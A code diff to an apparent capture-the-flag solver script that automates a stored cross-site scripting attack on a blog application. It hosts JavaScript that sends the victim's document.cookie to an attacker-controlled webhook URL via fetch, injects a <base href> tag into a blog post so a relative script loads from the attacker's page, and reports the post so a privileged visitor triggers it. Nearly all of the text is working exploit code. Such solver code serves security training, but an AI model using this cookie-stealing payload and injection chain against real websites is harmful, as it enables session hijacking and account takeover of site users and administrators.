@@ -35,13 +35,14 @@ class Solver:
         JS_PAYLOAD = f'fetch(`{self.webhooksite.url}?q=${{document.cookie}}`);'
         self.hosted_website.upload_file(js_filename, JS_PAYLOAD.encode(), write_to_root=True)
 
-        HTML_PAYLOAD = f'<script src="whydoesthiswork/whydoesthiswork/whydoesthiswork/whydoesthiswork/{js_script_path}"></script>'
-        HTML = f"<h1><pre>{html.escape(HTML_PAYLOAD)}</pre></h1>\n" + HTML_PAYLOAD # Only HTML_PAYLOAD is needed. <pre> is used for debugging
-        html_url = self.hosted_website.upload_file(HTML_FILENAME, HTML.encode(), write_to_root=True)
-        print(html_url)
+        HTML_PAYLOAD = f'<script src="{js_script_path}"></script>'
+        html_url = self.hosted_website.upload_file(HTML_FILENAME, f"<h1><pre>{html.escape(HTML_PAYLOAD)}</pre></h1>\n{HTML_PAYLOAD}".encode(), write_to_root=True) # Only HTML_PAYLOAD is needed. <pre> is used for debugging
 
-        PAYLOAD = f'<base href="{html_url}">'
-        response = self.session.post(f"{BASE_URL}/posts", data={"title": PAYLOAD, "content": PAYLOAD})
+        BLOG_POST_CONTENT_PAYLOAD = f'<base href="{html_url}">'
+        response = self.session.post(f"{BASE_URL}/posts", data={
+            "title": f"{HTML_PAYLOAD = }\n{JS_PAYLOAD = }\n{BLOG_POST_CONTENT_PAYLOAD = }",      # "title" can be anything
+            "content": f"{html.escape(BLOG_POST_CONTENT_PAYLOAD)}\n{BLOG_POST_CONTENT_PAYLOAD}"} # "content" must contain the payload
+        )
 
         # Report Blog Post
         response = self.session.post(f"{response.url}/report")
